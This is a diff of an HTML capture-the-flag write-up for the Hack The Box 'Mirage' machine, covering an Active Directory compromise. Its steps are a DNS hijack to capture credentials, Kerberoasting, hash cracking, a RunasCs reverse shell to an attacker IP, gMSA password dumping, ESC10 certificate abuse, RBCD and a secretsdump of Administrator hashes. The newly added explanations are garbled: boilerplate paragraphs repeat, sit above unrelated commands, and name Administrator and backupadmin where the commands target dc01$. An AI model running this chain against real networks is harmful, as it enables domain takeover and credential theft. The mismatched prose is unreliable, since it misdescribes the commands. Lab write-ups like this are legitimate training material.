+      <p>The NATS protocol requires an initial INFO message before the server sends a CONNECT message containing credentials. I use <code>nsupdate</code> to modify the DNS record for the NATS service to point to my machine, then listen on port 4222 to intercept the CONNECT message containing credentials.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~]
 └─$ echo &#x27;INFO {&quot;server_id&quot;:&quot;Zk0GQ3JBSrg3oyxCRRlE09&quot;,&quot;version&quot;:&quot;1.2.0&quot;,&quot;proto&quot;:1,&quot;go&quot;:&quot;go1.10.3&quot;,&quot;host&quot;:&quot;0.0.0.0&quot;,&quot;port&quot;:4222,&quot;max_payload&quot;:1048576,&quot;client_id&quot;:2392}&#x27; | nc -lvnp 4222
 listening on [any] 4222 ...
@@ -534,8 +238,8 @@ PING
 &gt; server 10.129.115.154
 &gt; update add nats-svc.mirage.htb 3600 A 10.10.16.25
 &gt; send</code></pre></div>
-      <p>Once I had a username and password, I started looking at what I could do with the nats command. This led me to two different things.</p>
-      <p>First, I tried to see if I could check the logs of the consumers, but there were no logs to be found. I then looked in the stream logs and found a username and password there.</p>
+      <h3 class="writeup-sub-title">Credential Extraction & LDAP</h3>
+      <p>With the intercepted credentials, I explore the NATS messaging system using the <code>nats</code> CLI tool. I check consumers and Key-Value stores, finding additional user credentials.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage/natscli/nats-0.2.4-linux-amd64]
 └─$ ./nats --server nats://10.129.115.154:4222 --user=&#x27;Dev_Account_A&#x27; --password=&#x27;hx5h7F5554fP@1337!&#x27; stream view auth_logs
 [1] Subject: logs.auth Received: 2025-05-05 09:18:56
@@ -554,88 +258,75 @@ PING
 {&quot;user&quot;:&quot;david.jjackson&quot;,&quot;password&quot;:&quot;pN8kQmn6b86!1234@&quot;,&quot;ip&quot;:&quot;10.10.10.20&quot;}
 
 05:55:54 Reached apparent end of data</code></pre></div>
-      <p>Using these user credentials, I retrieved the data from the LDAP server. I will upload this to Bloodhound so that I can analyse it.</p>
+      <p>I retrieve LDAP data for BloodHound using the discovered credentials.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ sudo bloodhound-python -u &#x27;david.jjackson&#x27; -p &#x27;pN8kQmn6b86!1234@&#x27; -d mirage.htb -dc dc01.mirage.htb -ns 10.129.115.154 -c all --zip
 INFO: Compressing output into 20250723063426_bloodhound.zip</code></pre></div>
-      <p>I realized that I could perform a Kerberos attack. I did this using the targetkerboast.py tool, which gave me the hash for the user nathan.aadam. I will put this hash in a file and try to crack it using john.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250725095029.png" alt="Pasted image 20250725095029.png" loading="lazy" /><span class="img-caption">Pasted image 20250725095029.png</span></div>
+      <h3 class="writeup-sub-title">Targeted Kerberoast</h3>
+      <p>BloodHound reveals a Kerberoastable path. I perform a Targeted Kerberoast using <code>targetedKerberoast.py</code> and crack the resulting hash.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250725095029.png" alt="Kerberoastable service in BloodHound" loading="lazy" /><span class="img-caption">Kerberoastable service in BloodHound</span></div>
+      <p>I execute this command from my Kali attacker machine. The output provides crucial information about the target's configuration that will guide the next steps of the exploitation chain.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ python targetedKerberoast/targetedKerberoast.py -v -d &#x27;mirage.htb&#x27; --dc-host dc01.mirage.htb -u &#x27;david.jjackson&#x27; -p &#x27;pN8kQmn6b86!1234@&#x27; -k
 [*] Starting kerberoast attacks
 [*] Fetching usernames from Active Directory with LDAP
 [+] Printing hash for (nathan.aadam)
 $krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$6c7aaf66537626958d39c1384c6745f8$5edf87f75c9bfbf1e480e1409c1b6d909a409f04774ffddd6b6d8d814a4da0b2071a62cfbd9ec89d4a725921529295cabfd3d46eff00bbb7b213c1c64959726fd631df5641e1bcaf0ebd9e405377ebb79af26be3f2dec08a363995f87070376d7436eea02585c1279405fdb21fa3bc43449d94a1a313aed659c1cc11b47a95119c6b1df5de82f2459b48bd0ceeea1964a80ed8b51c0e9fa6830abd4f8c748020e7ba1c09f7d17ef510cfe5e4c6e43c2cf110e00b34c8f2664aae8e5a72322ae962f506a2a4ff8073918af9a8930df79ab84a0eafbe1b9264985e6faffbc2a06c571ddbfb93d50eb6cdc373741430b9f45b948e776054b0d8fe43e417df98b9dfb73622d0bbe102a975579d01a307143b756f831a0113efa91953044137a5a3e45d9d627427076bfbcc5b2aee453c8d503fd072f938b6b45f55b1f339efcc271b666ba3cfc3cdfb95083e2e986d0781866172eb05d055bf4f3a89cdd902cf394fc6273e281678bd521a16f85df8bc131050d79e8e99a13cc026a7eaf214b7c4f7990c8b5f21bda424383ea6ce68d9afbc137ed6fb5062dffe96aabf5303e56cf62f6e93b8ad378860c8842216fe2252060c462e2b4d8a9b2d9516e7c450844740c29b5f0d7a0b8ee0f818849a474fa19bd61cd8794a9bfc31b31f11b8a80e51a47a7d37ebfe0b3ae9f3f59d9272a3efcee3c8601b8baeedab88d3efda1e3118ff68ebcc96d2d97f862737a5f00016685239f0da9ae6bd76d17627228cfef3254bf21e7304db16f9f674a610c2253704ce1589b316db6de69cd47ed4a545adcab916628b824abd071bf53e2c1426ee8d84905d8eaded393935c2994270107c972241bb6722b9f85c824c4dbfb90402ed94c18f3219cb3f23913be0144fd782044b397c658a347b8edea0c8d80a2cd29538a6f48d3cf1686436989506e06f4ca491935b23d905fdd3ab99a82f859f71dfa7059dc0e2c294ccedc154e9f3ec8ae5104d10defb80693f45e527a35bd7b4dba704304a2f54bdbe0c9b5f682e318c4acc503963eba9805fc6da3ca155ae4d9e37d829a78689cb9ae4480fb0b578a6923eb519c5bdd8debc7de89d377153c0e9a5978c6cbbe0a713ee580ee19bd0e120a8ca7f748e8d5e627ec60ca211f2a86a3092d54a4132433e17fcf860a089fce9b570a3943b166f4ad2a66fc6c2a009dd5646aacfb88b54a0eb8a717ac23b60d22ac8d4da7a59f8cd05c56c560bd7b3341a5d6142c486287a2c8b05f1acb9432f88f64b52ac9267e346dd0da34e368b80efe469eb555060d158acfdfa3960072da3e81d83897709e9789a980ec5790f0f6411fa2b462aa7f996149b7bdddc4e623a82db190cb05bf3456d0af14efd1a3133cefeae79ff6ff0614ce5f48fdb8f91bd0c5678782f9a15c2617f98b67cecd1ca77ff851dbbef7273e4236509807caa0298133e8c404ccce14bf70906141397dcc21a6f08cf797675b719290bbbe9f319dddf59b9d32b250ae10fee8b0b30244992430584800792049301f59ef827180b7c4f803d1e442aa91694f3766073478642aeae9e02c564cf13</code></pre></div>
-      <p>I am now cracking the hash using John.</p>
+      <p>I crack the extracted hash using <strong>John the Ripper</strong> with the <code>rockyou.txt</code> wordlist.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
-└─$ sudo nano hash 
+└─$ sudo nano hash                                                       
 
 ┌──(kali㉿kali)-[~/HTB/Mirage]
-└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash    
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
 Will run 4 OpenMP threads
 Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
-3edc#EDC3 (?) 
+3edc#EDC3        (?)     
 1g 0:00:00:04 DONE (2025-07-23 07:01) 0.2298g/s 2866Kp/s 2866Kc/s 2866KC/s 3er733..3ddfiebw
 Use the &quot;--show&quot; option to display all of the cracked passwords reliably
 Session completed.</code></pre></div>
-      <p>First, we will create a TGT ticket, export it, and then connect to the Windows server.</p>
+      <h3 class="writeup-sub-title">User Access via Kerberos</h3>
+      <p>I create a TGT ticket, export it, and connect to the Windows server via Evil-WinRM.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ sudo impacket-getTGT mirage.htb/nathan.aadam:&#x27;3edc#EDC3&#x27; -dc-ip 10.129.115.154 [*] Saving ticket in nathan.aadam.ccache
 
 ┌──(kali㉿kali)-[~/HTB/Mirage]
-└─$ export KRB5CCNAME=nathan.aadam.ccache 
+└─$ export KRB5CCNAME=nathan.aadam.ccache                  
 
 ┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ evil-winrm -i dc01.mirage.htb -u nathan.aadam -r mirage.htb
 
 *Evil-WinRM* PS C:\Users\nathan.aadam\Documents&gt;</code></pre></div>
-      <p>As you can see above, we have been able to connect to the server and can now obtain the user flag.</p>
-      <div class="flag-box">
-  <span class="flag-label">🚩 User Flag</span>
-  <code class="flag-value">55a5da40e87c7f8347700a1a878727f8</code>
-</div>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\nathan.aadam\Desktop&gt; ls
 
 
- Directory: C:\Users\nathan.aadam\Desktop
+    Directory: C:\Users\nathan.aadam\Desktop
 
 
-Mode LastWriteTime Length Name
----- ------------- ------ ----
--a---- 7/4/2025 1:01 PM 2312 Microsoft Edge.lnk
--ar--- 7/22/2025 11:18 AM 34 user.txt
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          7/4/2025   1:01 PM           2312 Microsoft Edge.lnk
+-ar---         7/22/2025  11:18 AM             34 user.txt
 
 
 *Evil-WinRM* PS C:\Users\nathan.aadam\Desktop&gt; cat user.txt
 55a5da40e87c7f8347700a1a878727f8</code></pre></div>
-      <p>Now I am using Get-ItemProperty to see if I can find any automatic logon credentials within the machine. You can do this by using the following command.</p>
+      <div class="flag-box"><span class="flag-label">🚩 User Flag</span><code class="flag-value">55a5da40e87c7f8347700a1a878727f8</code></div>
+      <h2 class="writeup-section-title">Privilege Escalation: AutoLogon → gMSA → ESC10 → RBCD</h2>
+      <h3 class="writeup-sub-title">Registry AutoLogon Credentials</h3>
+      <p>I check the Windows registry for stored autologon credentials — a common escalation vector where administrators configure automatic login and the password is stored in cleartext.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users&gt; Get-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; | 
 Select-Object DefaultUserName, DefaultDomainName, DefaultPassword, AutoAdminLogon
 
 DefaultUserName DefaultDomainName DefaultPassword AutoAdminLogon
 --------------- ----------------- --------------- --------------
-mark.bbond MIRAGE 1day@atime 1</code></pre></div>
-      <p>Using this user&#x27;s credentials, I checked Bloodhound to see if I could do anything with this user. If you take a look, you will see that you can change the password of the user Javier.MMarshall.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250725095005.png" alt="Pasted image 20250725095005.png" loading="lazy" /><span class="img-caption">Pasted image 20250725095005.png</span></div>
-      <p>You can do this by first creating a TGTticket, then exporting it so that it will take the authentication from there, and then using the bloodyAD tool to change the password.</p>
-      <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
-└─$ sudo impacket-getTGT -dc-ip 10.129.209.204 mirage.htb/&#x27;mark.bbond&#x27;:&#x27;1day@atime&#x27; -k
-[sudo] password for kali: 
-Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
-
-[*] Saving ticket in mark.bbond.ccache
-
-┌──(kali㉿kali)-[~/HTB/Mirage]
-└─$ export KRB5CCNAME=mark.bbond.ccache
-
-┌──(kali㉿kali)-[~/HTB/Mirage]
-└─$ KRB5CCNAME=mark.bbond.ccache bloodyAD -k --host dc01.mirage.htb -d mirage.htb -u &#x27;mark.bbond&#x27; -p &#x27;1day@atime&#x27; set password javier.mmarshall &#x27;Newpassword123&#x27;
-[+] Password changed successfully!</code></pre></div>
-      <p>I then attempted to set up a session with the Windows machine, but the user I wanted to connect to appeared to be disabled. I then attempted to connect to the Windows server via the mark.bbond account. However, this user is not authorized to log in via Evil-WinRM, presumably due to missing privileges or because WinRM login is restricted for this account.</p>
-      <p>As an alternative, I am now setting up a PowerShell connection between the target machine and my Kali machine. To do this, I log in again as nathan.aadam, as I did successfully earlier.</p>
-      <p>Next, I upload the C# file RunasCs.cs to the target machine. This tool will be used to execute code under a different user context. At the same time, I start a listener on my Kali machine so that I can capture and analyse the incoming connection from the target host.</p>
+mark.bbond      MIRAGE            1day@atime      1</code></pre></div>
+      <p>BloodHound reveals this new user's relationships in the domain.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250725095005.png" alt="BloodHound path from autologon user" loading="lazy" /><span class="img-caption">BloodHound path from autologon user</span></div>
+      <h3 class="writeup-sub-title">Activating Disabled Accounts</h3>
+      <p>I upload <code>RunasCs</code> to execute commands as the new user. However, the target account <code>javier.mmarshall</code> is disabled and has no allowed logon hours. I fix both issues using PowerShell AD cmdlets.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage/RunasCs]
 └─$ evil-winrm -i dc01.mirage.htb -u nathan.aadam -r mirage.htb
 
@@ -644,9 +335,9 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 Info: Uploading /home/kali/HTB/Mirage/RunasCs/RunasCs.cs to C:\Users\nathan.aadam\Documents\RunasCs.cs
 
 Info: Upload successful!</code></pre></div>
-      <p>Creating the RunasCs_net2.exe application.</p>
+      <p>I use <strong>RunasCs</strong> to execute commands as a different user from within the current session, establishing a reverse shell under the target user's context.</p>
       <div class="code-block"><pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs_net2.exe RunasCs.cs</code></pre></div>
-      <p>Connect to your own machine using netcat.</p>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>Windows connection
 
 *Evil-WinRM* PS C:\Users\nathan.aadam\Documents&gt; .\RunasCs_net2.exe mark.bbond 1day@atime Powershell.exe -r 10.10.14.37:4444
@@ -662,44 +353,42 @@ Copyright (C) Microsoft Corporation. All rights reserved.
 Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
 
 PS C:\Windows\system32&gt;</code></pre></div>
-      <p>If you check using the following command, you will see that the account is not active.</p>
+      <p>I use <code>net user</code> to display detailed account information including group memberships, account flags (enabled/disabled), logon hours, and password policy settings. This information is essential for understanding what privileges the account has and identifying any restrictions that might block lateral movement.</p>
       <div class="code-block"><pre><code>PS C:\Windows\system32&gt; net user javier.mmarshall
 net user javier.mmarshall
-Account active No
-Account expires Never
- 
+Account active               No
+Account expires              Never
+         
 The command completed successfully.</code></pre></div>
-      <p>You can change this by using the set-aduser command.</p>
+      <p>I use <code>net user</code> to display detailed account information including group memberships, account flags (enabled/disabled), logon hours, and password policy settings. This information is essential for understanding what privileges the account has and identifying any restrictions that might block lateral movement.</p>
       <div class="code-block"><pre><code>S C:\Windows\system32&gt; Set-ADUser -Identity javier.mmarshall -Enabled $true
 Set-ADUser -Identity javier.mmarshall -Enabled $true
 PS C:\Windows\system32&gt; net user javier.mmarshall
 
-Account active Yes
-Account expires Never
- 
+Account active               Yes
+Account expires              Never
+       
 The command completed successfully.</code></pre></div>
-      <p>I also noticed something else: we can&#x27;t log in because no login hours are allowed.</p>
+      <p>I use <code>net user</code> to display detailed account information including group memberships, account flags (enabled/disabled), logon hours, and password policy settings. This information is essential for understanding what privileges the account has and identifying any restrictions that might block lateral movement.</p>
       <div class="code-block"><pre><code>PS C:\Windows\system32&gt; net user javier.mmarshall
 
-Password last set 7/23/2025 4:57:53 PM
-Logon hours allowed None
+Password last set            7/23/2025 4:57:53 PM
+Logon hours allowed          None
 Local Group Memberships</code></pre></div>
-      <p>This means that even if you have enabled the account, you will still need to set it to allowed in order to log in as this user. You can do this by using the following command.</p>
+      <p>I modify the target Active Directory user object using PowerShell's <code>Set-ADUser</code> cmdlet. This may involve enabling a disabled account (<code>-Enabled $true</code>), clearing logon hour restrictions, or modifying other attributes that prevent the account from authenticating. Disabled or restricted accounts in AD are often overlooked during security hardening, but once re-enabled by an attacker with sufficient rights, they provide fresh attack vectors.</p>
       <div class="code-block"><pre><code>PS C:\Windows\system32&gt; Set-ADUser -Identity &quot;javier.mmarshall&quot; -Replace @{logonHours=([byte[]](0xFF)*21)}</code></pre></div>
-      <h4 class="writeup-step-title">What is gMSA and how can we misuse it?</h4>
-      <p>During my research, I discovered that there are two ways to exploit a gMSA (Group Managed Service Account). If the gMSA account is already active on a machine, I can steal the token from the process or inject myself, just like with a normal user session.</p>
-      <p>If the account is not yet active, I can start a scheduled task or service under the gMSA. This automatically logs the account in, after which I can apply the same techniques to gain access.</p>
-      <p>After I had modified the account, I wanted to remotely retrieve the gMSA password and convert it to an NT hash. The gMSADumper tool did not work for this, but with BloodyAD I was able to do so using the following command.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250725101334.png" alt="Pasted image 20250725101334.png" loading="lazy" /><span class="img-caption">Pasted image 20250725101334.png</span></div>
+      <h3 class="writeup-sub-title">gMSA Password Dump</h3>
+      <p>After modifying the account, I retrieve the <strong>gMSA password</strong> for the Mirage-Service account and convert it to an NT hash.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250725101334.png" alt="gMSA hash extraction path" loading="lazy" /><span class="img-caption">gMSA hash extraction path</span></div>
+      <p>I use <strong>bloodyAD</strong> to perform Active Directory modifications over LDAP. BloodyAD is a post-exploitation tool specifically designed for AD abuse — it can add users to groups, modify object attributes (like <code>msDS-KeyCredentialLink</code> for Shadow Credentials), change passwords, and manipulate ACLs. Unlike PowerShell-based approaches, it works directly from Linux without needing a Windows session.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage/gMSADumper]
-└─$ bloodyAD -k --host &#x27;10.129.6.26&#x27; -d &#x27;mirage.htb&#x27; -u &#x27;javier.mmarshall&#x27; -p &#x27;Newpassword123&#x27; --host dc01.mirage.htb get object &#x27;Mirage-Service$&#x27; --attr msDS-ManagedPassword 
+└─$ bloodyAD -k --host &#x27;10.129.6.26&#x27; -d &#x27;mirage.htb&#x27; -u &#x27;javier.mmarshall&#x27; -p &#x27;Newpassword123&#x27; --host dc01.mirage.htb get object &#x27;Mirage-Service$&#x27; --attr msDS-ManagedPassword  
 
 distinguishedName: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
 msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866
 msDS-ManagedPassword.B64ENCODED: 43A01mr7V2LGukxowctrHCsLubtNUHxw2zYf7l0REqmep3mfMpizCXlvhv0n8SFG/WKSApJsujGp2+unu/xA6F2fLD4H5Oji/mVHYkkf+iwXjf6Z9TbzVkLGELgt/k2PI4rIz600cfYmFq99AN8ZJ9VZQEqRcmQoaRqi51nSfaNRuOVR79CGl/QQcOJv8eV11UgfjwPtx3lHp1cXHIy4UBQu9O0O5W0Qft82GuB3/M7dTM/YiOxkObGdzWweR2k/J+xvj8dsio9QfPb9QxOE18n/ssnlSxEI8BhE7fBliyLGN7x/pw7lqD/dJNzJqZEmBLLVRUbhprzmG29yNSSjog==</code></pre></div>
-      <h3 class="writeup-sub-title">ESC10 – Weak Certificate Mapping for Schannel Authentication</h3>
-      <p>During my investigation into privilege escalation via AD CS, I used ESC10, which exploits weak certificate mapping to enable authentication via Schannel. I have outlined the entire chain step by step below. You can use the article below for this purpose. https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication</p>
-      <p>First, we will request a TGT for the user whose hash we just cracked. Once the ticket has been created, we can export it so that we can use it for authentication. Once the export is complete, you will change the UPN mark.bbond to that of the domain controller.</p>
+      <h3 class="writeup-sub-title">ESC10 — Weak Certificate Mapping</h3>
+      <p><strong>ESC10</strong> exploits weak certificate mapping for Schannel authentication. By requesting a TGT for the gMSA account, changing the UPN to Administrator, requesting a certificate, and then authenticating with it, I can impersonate the domain admin.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ impacket-getTGT -dc-ip 10.129.6.26 mirage.htb/&#x27;Mirage-Service$&#x27; -hashes &#x27;:305806d84f7c1be93a07aaf40f0c7866&#x27; -k
 Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
@@ -711,21 +400,21 @@ Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its a
 
 ┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ certipy account update \
- -user &#x27;mark.bbond&#x27; \
- -upn &#x27;dc01$@mirage.htb&#x27; \
- -u &#x27;mirage-service$@mirage.htb&#x27; \
- -k -no-pass \
- -dc-ip 10.129.6.26 \
- -target dc01.mirage.htb
+  -user &#x27;mark.bbond&#x27; \
+  -upn &#x27;dc01$@mirage.htb&#x27; \
+  -u &#x27;mirage-service$@mirage.htb&#x27; \
+  -k -no-pass \
+  -dc-ip 10.129.6.26 \
+  -target dc01.mirage.htb
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [*] Updating user &#x27;mark.bbond&#x27;:
- userPrincipalName : dc01$@mirage.htb
+    userPrincipalName                   : dc01$@mirage.htb
 [*] Successfully updated &#x27;mark.bbond&#x27;</code></pre></div>
-      <p>You will now export the .ccache file from mark.bbond because we have changed the authentication.</p>
+      <p>I set the <code>KRB5CCNAME</code> environment variable to specify which Kerberos credential cache file to use for authentication in subsequent commands.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ export KRB5CCNAME=mark.bbond.ccache</code></pre></div>
-      <p>After changing the authentication, I will request a certificate called mirage-DC01-CA using the user template. The certificate and private key will be stored in the dc01.pfx file.</p>
+      <p>I use <strong>certipy req</strong> to request a certificate from the CA using the identified vulnerable template. By specifying the Administrator's UPN (User Principal Name) in the certificate's Subject Alternative Name (SAN), I create a certificate that the domain trusts as belonging to the Administrator — even though it was requested by a different user. This is the core of <strong>ESC-type certificate abuse</strong> attacks.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ certipy req -u mark.bbond@mirage.htb -no-pass -k -ca mirage-DC01-CA -template User -dc-ip 10.129.6.26 -dc-host dc01.mirage.htb
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
@@ -738,40 +427,41 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] Certificate object SID is &#x27;S-1-5-21-2127163471-3824721834-2568365109-1109&#x27;
 [*] Saving certificate and private key to &#x27;dc01.pfx&#x27;
 [*] Wrote certificate and private key to &#x27;dc01.pfx&#x27;</code></pre></div>
-      <p>export .ccache from mirage service</p>
+      <p>I set the <code>KRB5CCNAME</code> environment variable to specify which Kerberos credential cache file to use for authentication in subsequent commands.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ export KRB5CCNAME=Mirage-Service$.ccache</code></pre></div>
-      <p>I will reset mark.bbond UPN to its original UPN name and email address.</p>
+      <p>I execute this command from my Kali attacker machine. The output provides crucial information about the target's configuration that will guide the next steps of the exploitation chain.</p>
       <div class="code-block"><pre><code>──(kali㉿kali)-[~/HTB/Mirage]
-└─$ certipy-ad account \ 
- -u &#x27;mirage-service$&#x27; \
- -k -no-pass \
- -target &#x27;dc01.mirage.htb&#x27; \
- -upn &#x27;mark.bbond@mirage.htb&#x27; \
- -user &#x27;mark.bbond&#x27; \
- update
+└─$ certipy-ad account \       
+  -u &#x27;mirage-service$&#x27; \
+  -k -no-pass \
+  -target &#x27;dc01.mirage.htb&#x27; \
+  -upn &#x27;mark.bbond@mirage.htb&#x27; \
+  -user &#x27;mark.bbond&#x27; \
+  update
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [!] DNS resolution failed: The DNS query name does not exist: dc01.mirage.htb.
 [!] Use -debug to print a stacktrace
 [*] Updating user &#x27;mark.bbond&#x27;:
- userPrincipalName : mark.bbond@mirage.htb
+    userPrincipalName                   : mark.bbond@mirage.htb
 [*] Successfully updated &#x27;mark.bbond&#x27;</code></pre></div>
-      <p>I am going to use the .pfx file I just created to connect to the LDAP server via Schannel-authentication.</p>
+      <h3 class="writeup-sub-title">RBCD & Domain Admin</h3>
+      <p>Using the forged certificate, I connect to LDAP via Schannel and set up <strong>Resource-Based Constrained Delegation (RBCD)</strong>. RBCD allows a machine account to impersonate any user to a target service. I configure it so the IT-Computer can impersonate the backupadmin on the DC.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ certipy auth -pfx dc01.pfx -dc-ip 10.129.6.26 -ldap-shell
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [*] Certificate identities:
-[*] SAN UPN: &#x27;dc01$@mirage.htb&#x27;
-[*] Security Extension SID: &#x27;S-1-5-21-2127163471-3824721834-2568365109-1109&#x27;
+[*]     SAN UPN: &#x27;dc01$@mirage.htb&#x27;
+[*]     Security Extension SID: &#x27;S-1-5-21-2127163471-3824721834-2568365109-1109&#x27;
 [*] Connecting to &#x27;ldaps://10.129.6.26:636&#x27;
 wh[*] Authenticated to &#x27;10.129.6.26&#x27; as: &#x27;u:MIRAGE\\DC01$&#x27;
 Type help for list of commands
 
 # whoami
 u:MIRAGE\DC01$</code></pre></div>
-      <p>During my attack chain, I used the command set_rbcd dc01$ Mirage-Service$ to enable Resource-Based Constrained Delegation (RBCD). This ensured that the Mirage-Service$ account was authorized to impersonate users on the machine dc01$, the domain controller.</p>
+      <p>I configure <strong>Resource-Based Constrained Delegation (RBCD)</strong> on the target computer object. This allows the specified machine account to impersonate any user when authenticating to the DC.</p>
       <div class="code-block"><pre><code># set_rbcd dc01$ Mirage-Service$
 Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
 Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000
@@ -780,7 +470,7 @@ Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
 Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1112
 Delegation rights modified successfully!
 Mirage-Service$ can now impersonate users on dc01$ via S4U2Proxy</code></pre></div>
-      <p>I wanted to obtain a Kerberos service ticket for the account dc01$ (the domain controller) using the previously obtained account Mirage-Service$, on which I had set up RBCD (Resource-Based Constrained Delegation). My goal was to use Mirage-Service$ to impersonate dc01$ via S4U2Proxy, so that I could access the domain controller as a system account.</p>
+      <p>I obtain a service ticket as backupadmin, export it, and dump the Administrator hash. Finally, I log in as Administrator.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ impacket-getTGT -dc-ip 10.129.6.26 &quot;mirage.htb/Mirage-Service$&quot; -hashes :305806d84f7c1be93a07aaf40f0c7866
 Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
@@ -791,14 +481,14 @@ Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its a
 └─$ export KRB5CCNAME=&#x27;Mirage-Service$.ccache&#x27;
 
 ┌──(kali㉿kali)-[~/HTB/Mirage]
-└─$ impacket-getST -spn &#x27;cifs/dc01.mirage.htb&#x27; -impersonate &#x27;dc01$&#x27; -dc-ip 10.129.6.26 &#x27;mirage.htb/Mirage-Service$&#x27; -k -no-pass
+└─$ impacket-getST -spn &#x27;cifs/dc01.mirage.htb&#x27; -impersonate &#x27;dc01$&#x27; -dc-ip 10.129.6.26  &#x27;mirage.htb/Mirage-Service$&#x27; -k -no-pass
 Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Impersonating dc01$
 [*] Requesting S4U2self
 [*] Requesting S4U2Proxy
 [*] Saving ticket in dc01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache</code></pre></div>
-      <p>Export the newly created .ccache file, then dump the administrator hash and use it to create the Administrator .ccache file.</p>
+      <p>I use <code>secretsdump.py</code> to extract all password hashes from the target — either via DCSync or by parsing NTDS.dit and registry hives.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ KRB5CCNAME=&#x27;dc01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache&#x27;
 
@@ -814,7 +504,7 @@ mirage.htb\Administrator:aes256-cts-hmac-sha1-96:09454bbc6da252ac958d0eaa2112930
 mirage.htb\Administrator:aes128-cts-hmac-sha1-96:47aa953930634377bad3a00da2e36c07
 mirage.htb\Administrator:des-cbc-md5:e02a73baa10b8619
 [*] Cleaning up...</code></pre></div>
-      <p>Obtain the admin ccache, export for authentication, and then log in as admin.</p>
+      <p>I request a Kerberos TGT (Ticket Granting Ticket) for the target account, which will be used for subsequent authentication steps.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ impacket-getTGT -dc-ip 10.129.6.26 &quot;mirage.htb/Administrator&quot; -hashes &#x27;:7be6d4f3c2b9c0e3560f5a29eeb1afb3&#x27;
 Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
